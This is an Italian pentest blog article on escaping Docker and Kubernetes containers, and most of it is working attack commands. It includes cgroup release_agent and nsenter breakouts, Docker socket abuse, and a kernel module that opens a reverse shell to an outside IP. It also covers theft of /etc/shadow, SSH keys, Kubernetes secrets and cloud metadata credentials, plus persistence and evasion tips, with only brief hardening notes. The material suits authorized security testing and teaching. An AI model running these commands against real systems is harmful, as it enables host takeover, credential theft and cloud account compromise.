---
title: 'Container Escape: tecniche reali per uscire dal container'
slug: container-escape
description: 'Container escape: scopri tecniche reali di fuga da Docker e Kubernetes per privilege escalation e breakout in ambienti reali.'
image: '/ChatGPT Image Feb 22, 2026, 03_40_21 PM.webp'
draft: true
date: 2026-02-26T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - kubernetes
  - docker
---

> **Executive Summary** — Il container escape è il processo di uscita da un container (Docker, Kubernetes, Podman, LXC) per ottenere accesso al sistema host sottostante. Nel pentest moderno, compromettere un'applicazione spesso significa finire dentro un container — e da lì il confine tra te e l'host è più sottile di quanto si pensi. Un container "privilegiato", un socket Docker montato, una capability Linux eccessiva o un kernel non patchato sono tutti vettori per l'escape. In Kubernetes, l'escape da un pod può dare accesso all'intero cluster. Il container escape è il privilege escalation del mondo cloud-native.**TL;DR**
> • Container privilegiato (`--privileged`) = quasi sempre root-equivalente sul nodo: accesso ai device, molte capability abilitate, possibile montare filesystem/namespace dell’host (escape facile se combinato con mount/daemon).
> • Socket Docker montato (`/var/run/docker.sock`) = controllo completo del Docker daemon: puoi avviare un container e montare `/` dell’host, ottenendo accesso al filesystem host.
> • Capabilities Linux eccessive (`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_DAC_READ_SEARCH`) = superfici d’attacco extra: mount/namespace abuse, ptrace su processi, bypass letture su file/dir → escape/abusi specifici per capability.

## Perché il Container Escape è Fondamentale

Nel pentest 2026, la maggior parte delle applicazioni gira in container. Quando ottieni[ RCE ](https://hackita.it/articoli/rce)su un'applicazione web, quasi sempre atterri in un container Docker o un pod Kubernetes — non direttamente sull'host. Il container è isolato: filesystem separato, namespace diversi, risorse limitate. Ma l'isolamento è imperfetto — è basato su funzionalità del kernel Linux (namespaces, cgroups, capabilities), non su virtualizzazione hardware. Ogni misconfiguration è un potenziale escape.

La catena tipica in un engagement cloud:

```
RCE nell'app web → shell nel container → container escape → root sull'host
                                        → accesso al cluster Kubernetes
                                        → lateral movement verso altri container/host
                                        → cloud metadata (IMDS) → AWS/GCP/Azure privesc
```

## 1. Capire Dove Sei — Detection dell'Ambiente Container

Prima di tutto: sei in un container? E se sì, quale tipo?

### Sei in un container?

```bash
# Indicatori di container
cat /proc/1/cgroup 2>/dev/null | grep -i "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubepods"
hostname  # Spesso un hash tipo a1b2c3d4e5f6
```

**Output (Docker):**

```
12:memory:/docker/a1b2c3d4e5f6789...
-rw-r--r-- 1 root root 0 Jan  1 00:00 /.dockerenv
```

**Output (Kubernetes):**

```
12:memory:/kubepods/burstable/pod-abc123/container-def456
```

**Se nessuno di questi indicatori è presente, probabilmente sei sull'host.**

### Raccolta informazioni dal container

```bash
# OS e kernel (condiviso con l'host!)
uname -a
cat /etc/os-release

# Utente corrente
id
whoami

# Capabilities del container
cat /proc/self/status | grep -i cap
# Oppure:
capsh --print 2>/dev/null

# Mount points (cerca socket Docker, filesystem host)
mount | grep -iE "docker|sock|host|nsfs"
ls -la /var/run/docker.sock 2>/dev/null

# Variabili ambiente (credenziali, token Kubernetes)
env | grep -iE "kube|token|secret|password|api|aws|azure|gcp"

# Service account Kubernetes
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# Network namespace
ip addr
cat /etc/hosts
cat /etc/resolv.conf
```

**Cosa cerchi:** socket Docker montato, capabilities eccessive, modalità privilegiata, token Kubernetes, variabili con credenziali cloud.

## 2. Escape da Container Privilegiato (`--privileged`)

Un container avviato con `--privileged` non ha praticamente nessuna restrizione: ha tutte le capabilities Linux, accesso ai device dell'host, e nessun profilo seccomp/AppArmor. È come essere root sull'host ma con un filesystem diverso.

### Verifica se sei privilegiato

```bash
# Controlla tutte le capabilities
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff  ← Tutte le capabilities = privilegiato

# Oppure:
capsh --print 2>/dev/null | grep "Current"
# Current: = cap_chown,cap_dac_override,cap_dac_read_search,...,cap_sys_admin,...
# Se la lista è lunghissima (30+ capabilities), sei privilegiato
```

### Escape via mount del filesystem host

```bash
# Lista i device dell'host
fdisk -l 2>/dev/null
lsblk 2>/dev/null
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
```

**Output:**

```
/dev/sda1  Linux filesystem
/dev/sda2  Linux swap
```

```bash
# Monta il filesystem root dell'host
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Ora hai il filesystem dell'host
ls /mnt/host/
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa
```

**Cosa fai dopo:** hai il filesystem completo dell'host. Per la [credential extraction](https://hackita.it/articoli/dcsync), leggi `/etc/shadow` e chiavi SSH. Per la persistenza: inietta chiave SSH in `/mnt/host/root/.ssh/authorized_keys` o aggiungi un cronjob in `/mnt/host/etc/crontab`.

### Escape via cgroup release\_agent (classico)

```bash
# Crea un cgroup con release_agent che punta a un comando sull'host
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/escape
echo 1 > $d/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

# Scrivi il comando da eseguire sull'host
cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output
# Oppure: bash -i >& /dev/tcp/10.10.10.200/9001 0>&1
EOF
chmod +x /cmd

# Trigger: lancia un processo nel cgroup e fallo terminare
echo $$ > $d/escape/cgroup.procs
# Il release_agent esegue /cmd sull'host

cat /output
```

**Lettura:** il `release_agent` è un binario che il kernel esegue sull'host quando un cgroup diventa vuoto. Scrivendo il path di un nostro script nel release\_agent e triggando l'evento, otteniamo esecuzione di codice sull'host.

### Escape via nsenter

```bash
# Se sei privilegiato, puoi entrare nei namespace dell'host
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Output:**

```
root@host:/#
```

**Lettura:** `nsenter` entra nei namespace del PID 1 (init dell'host). `--target 1` + tutti i namespace = shell sull'host. Il modo più pulito e rapido di escape da container privilegiato.

## 3. Escape via Docker Socket Montato

Se il container ha accesso al socket Docker (`/var/run/docker.sock`), puoi controllare il Docker daemon dell'host — creare container, montare filesystem, eseguire comandi.

### Verifica

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Jan 1 00:00 /var/run/docker.sock
```

Se esiste e hai permessi di lettura/scrittura, hai accesso completo al Docker daemon.

### Escape

```bash
# Se docker CLI è disponibile nel container:
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt bash

# Se docker CLI non è disponibile, usa curl:
# Lista container
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# Crea container con host mount
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/etc/shadow"],"Binds":["/:/mnt"],"HostConfig":{"Binds":["/:/mnt"]}}'

# Avvia e leggi output
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/[ID]/start
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/[ID]/logs?stdout=true
```

Per il dettaglio completo sull'exploitation del Docker API, vedi la [guida alla porta 2375 Docker](https://hackita.it/articoli/porta-2375-docker-api) — le tecniche sono identiche, cambia solo il trasporto (socket Unix vs TCP).

## 4. Escape via Capabilities Linux

Le capabilities Linux sono permessi granulari assegnati ai processi. Un container non-privilegiato può avere capabilities specifiche che permettono l'escape.

### Verifica capabilities

```bash
capsh --print 2>/dev/null
# Oppure:
grep Cap /proc/self/status
# CapEff: 00000000a80425fb
# Decodifica:
capsh --decode=00000000a80425fb
```

### CAP\_SYS\_ADMIN — Il più pericoloso

Con `SYS_ADMIN`, puoi montare filesystem, usare cgroup e fare quasi tutto quello che fa `--privileged`.

```bash
# Verifica
cat /proc/self/status | grep CapEff
# Decodifica e cerca SYS_ADMIN

# Escape via mount
mount -t proc proc /mnt 2>/dev/null && echo "SYS_ADMIN confirmed"

# Usa la tecnica cgroup release_agent (sezione 2)
```

### CAP\_SYS\_PTRACE — Debug di processi host

Con `SYS_PTRACE` e PID namespace condiviso (`--pid=host`), puoi iniettare codice nei processi dell'host.

```bash
# Verifica PID namespace condiviso
ps aux | grep -v "grep" | head -20
# Se vedi processi dell'host (systemd, sshd, etc): PID namespace condiviso

# Inietta shellcode in un processo host
# Trova un processo root sull'host
ps aux | grep root | grep -v grep
# PID 1234: /usr/sbin/sshd

# Inietta con process_vm_writev o ptrace
# Tool: https://github.com/0x00pf/0x00sec_code/blob/master/injector/infect.c
```

### CAP\_DAC\_READ\_SEARCH — Leggi qualsiasi file

Con `DAC_READ_SEARCH`, puoi leggere qualsiasi file sul filesystem — bypassa i permessi di lettura.

```bash
# Tool: shocker exploit
# https://github.com/gabber12/shocker (richiede DAC_READ_SEARCH)
python3 shocker.py --file /etc/shadow
```

### CAP\_NET\_ADMIN — Manipolazione rete

Con `NET_ADMIN`, puoi sniffare traffico, modificare routing e fare ARP spoofing sulla rete dell'host.

```bash
# Sniffa traffico dell'host (se network namespace condiviso)
tcpdump -i eth0 -w /tmp/capture.pcap
```

### CAP\_SYS\_MODULE — Carica kernel module

Con `SYS_MODULE`, puoi caricare un kernel module sull'host — RCE a livello kernel.

```bash
# Compila un kernel module malevolo
cat > /tmp/escape.c << 'EOF'
#include <linux/module.h>
#include <linux/kmod.h>
static int __init escape_init(void) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.10.200/9001 0>&1", NULL};
    char *envp[] = {"PATH=/usr/bin:/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}
static void __exit escape_exit(void) {}
module_init(escape_init);
module_exit(escape_exit);
MODULE_LICENSE("GPL");
EOF

make -C /lib/modules/$(uname -r)/build M=/tmp modules
insmod /tmp/escape.ko
# Reverse shell dall'host
```

## 5. Escape da Kubernetes Pod

In Kubernetes, l'escape da un pod segue le stesse logiche Docker ma con vettori aggiuntivi: service account token, API server access, etcd.

### Service account con permessi eccessivi

```bash
# Verifica il service account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Configura kubectl
export KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export KUBE_API="https://kubernetes.default.svc"

# Verifica i tuoi permessi
curl -sk -H "Authorization: Bearer $KUBE_TOKEN" \
  $KUBE_API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

# Con kubectl (se disponibile):
kubectl auth can-i --list
```

**Output critico:**

```
pods/exec    *    create   ← Puoi eseguire comandi in altri pod
secrets      *    get      ← Puoi leggere i secret (credenziali, token)
pods         *    create   ← Puoi creare pod (con mount host)
nodes/proxy  *    create   ← Puoi raggiungere la kubelet API
```

### Crea pod con host mount

```bash
cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: hostfs
    hostPath:
      path: /
  hostNetwork: true
  hostPID: true
EOF

kubectl exec -it escape-pod -- chroot /host bash
```

### Leggi secret Kubernetes

```bash
# Lista secret nel namespace
kubectl get secrets
kubectl get secrets -A  # Tutti i namespace (se hai permessi)

# Leggi un secret
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d
```

**Cosa trovi nei secret:** credenziali database, API key, certificati TLS, token di servizi esterni, [credenziali cloud per AWS/Azure/GCP](https://hackita.it/articoli/aws-privilege-escalation).

### Kubelet API (porta 10250)

Se raggiungi la kubelet API (tipicamente sulla porta 10250 del nodo):

```bash
# Lista pod sul nodo
curl -sk https://[node_ip]:10250/pods

# Esegui comando in un pod
curl -sk https://[node_ip]:10250/run/[namespace]/[pod]/[container] \
  -X POST -d "cmd=id"
```

### etcd non autenticato (porta 2379)

Se raggiungi etcd senza auth, hai accesso a tutti i secret del cluster:

```bash
etcdctl --endpoints=http://[etcd_ip]:2379 get / --prefix --keys-only | grep secret
etcdctl --endpoints=http://[etcd_ip]:2379 get /registry/secrets/default/db-credentials
```

Per il dettaglio su Zookeeper/etcd come servizi di coordinamento, vedi la [guida alla porta 2181 Zookeeper](https://hackita.it/articoli/porta-2181-zookeeper) — il pattern di attacco è analogo.

## 6. Escape via Cloud Metadata (IMDS)

Se il container gira su un'istanza cloud (EC2, GCE, Azure VM), puoi accedere al metadata service per ottenere credenziali cloud.

```bash
# AWS IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/[role_name]

# AWS IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Cosa fai dopo:** le credenziali cloud permettono [privilege escalation nel cloud provider](https://hackita.it/articoli/aws-privilege-escalation). Da un singolo container compromesso puoi arrivare ad Admin dell'intero account cloud.

## 7. Escape via Kernel Exploit

Il container condivide il kernel con l'host. Un kernel exploit nel container = root sull'host.

```bash
# Versione kernel
uname -r
# 5.4.0-42-generic

# Cerca kernel exploit
searchsploit linux kernel 5.4 privilege escalation
```

Exploit kernel noti per container escape:

| CVE            | Nome                                  | Versioni      | Impatto                          |
| -------------- | ------------------------------------- | ------------- | -------------------------------- |
| CVE-2022-0185  | Heap overflow in legacy\_parse\_param | 5.1 - 5.16.2  | Escape da container unprivileged |
| CVE-2022-0847  | Dirty Pipe                            | 5.8 - 5.16.11 | File overwrite → root            |
| CVE-2021-22555 | Netfilter heap OOB                    | 2.6.19 - 5.12 | Escape da container              |
| CVE-2020-14386 | AF\_PACKET overflow                   | 4.6 - 5.9     | Root + escape                    |
| CVE-2024-1086  | nf\_tables use-after-free             | 3.15 - 6.8    | Root + escape                    |

```bash
# Esempio: Dirty Pipe (CVE-2022-0847) per sovrascrivere /etc/passwd dell'host
# Funziona se il kernel è 5.8 - 5.16.11
# L'exploit sovrascrive un file read-only (es: /etc/passwd) senza permessi
./dirty_pipe /etc/passwd 1 "${hacked_line}"
```

## 8. Scenari Pratici

### Scenario 1: Webapp in Docker privilegiato

**Step 1:** RCE nell'app → shell nel container

**Step 2:**

```bash
cat /proc/self/status | grep CapEff
# 000001ffffffffff → privilegiato
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Step 3:** root sull'host

**Tempo stimato:** 1-2 minuti

### Scenario 2: Container con Docker socket

**Step 1:** RCE → shell nel container

**Step 2:**

```bash
ls /var/run/docker.sock && docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

**Tempo stimato:** 1-3 minuti

### Scenario 3: Pod Kubernetes con service account privilegiato

**Step 1:** RCE → shell nel pod

**Step 2:**

```bash
kubectl auth can-i --list
# pods/exec create → esegui comandi in altri pod
# secrets get → leggi credenziali
```

**Step 3:** crea pod con host mount o leggi secret

**Tempo stimato:** 5-15 minuti

## 9. Detection & Evasion

### Blue Team

* **Falco/Sysdig**: rileva mount anomali, nsenter, accesso a /proc, capability abuse
* **Kubernetes audit log**: creazione pod privilegiati, secret access, exec in pod
* **EDR container-aware**: CrowdStrike Falcon, Aqua Security, Prisma Cloud

### Evasion

```
Tecnica: Usa curl al Docker socket invece di docker CLI
Come: curl --unix-socket → meno binari sospetti nei log
```

```
Tecnica: Leggi file singoli via /proc/1/root invece di mount
Come: cat /proc/1/root/etc/shadow — no mount visibile
Requisito: PID namespace condiviso o privilegiato
```

## 10. Cheat Sheet Finale

### Detection ambiente

| Check                 | Comando                                               |
| --------------------- | ----------------------------------------------------- |
| Sono in un container? | `cat /proc/1/cgroup \| grep docker`                   |
| Docker?               | `ls /.dockerenv`                                      |
| Kubernetes?           | `ls /var/run/secrets/kubernetes.io/`                  |
| Privilegiato?         | `cat /proc/self/status \| grep CapEff` → `ffffffffff` |
| Docker socket?        | `ls /var/run/docker.sock`                             |
| Capabilities?         | `capsh --print`                                       |
| Kernel version?       | `uname -r`                                            |
| Cloud?                | `curl -s http://169.254.169.254/`                     |

### Escape vectors

| Vettore                | Requisito                    | Comando                                                      |
| ---------------------- | ---------------------------- | ------------------------------------------------------------ |
| nsenter                | `--privileged`               | `nsenter --target 1 --mount --uts --ipc --net --pid -- bash` |
| Mount device           | `--privileged`               | `mount /dev/sda1 /mnt/host`                                  |
| cgroup release\_agent  | `--privileged` o `SYS_ADMIN` | Vedi sezione 2                                               |
| Docker socket          | Socket montato               | `docker -H unix:///var/run/docker.sock run -v /:/mnt alpine` |
| SYS\_PTRACE + PID host | `SYS_PTRACE` + `--pid=host`  | Process injection                                            |
| SYS\_MODULE            | `SYS_MODULE`                 | `insmod escape.ko`                                           |
| K8s pod create         | SA con `pods create`         | `kubectl apply -f escape-pod.yaml`                           |
| K8s secret read        | SA con `secrets get`         | `kubectl get secret -o jsonpath`                             |
| Cloud IMDS             | Rete raggiungibile           | `curl http://169.254.169.254/...`                            |
| Kernel exploit         | Kernel vulnerabile           | Dirty Pipe, CVE-2022-0185, etc                               |

### Hardening

* Mai `--privileged` in produzione
* Mai montare il Docker socket nei container
* Drop all capabilities + aggiungi solo quelle necessarie
* Read-only filesystem dove possibile
* Pod Security Standards (Kubernetes): restricted
* IMDSv2 enforced (blocca SSRF → IMDS)
* Kernel aggiornato
* Runtime security: Falco, Sysdig, gVisor/Kata (isolamento kernel)

***

Riferimento: [Docker Security](https://docs.docker.com/engine/security/?utm_source=chatgpt.com), [Kubernetes Security Overview](https://www.appsecengineer.com/blog/defending-kubernetes-clusters-against-container-escape-attacks?utm_source=chatgpt.com), [HackTricks Docker Security / Container Escape](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security?utm_source=chatgpt.com). Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
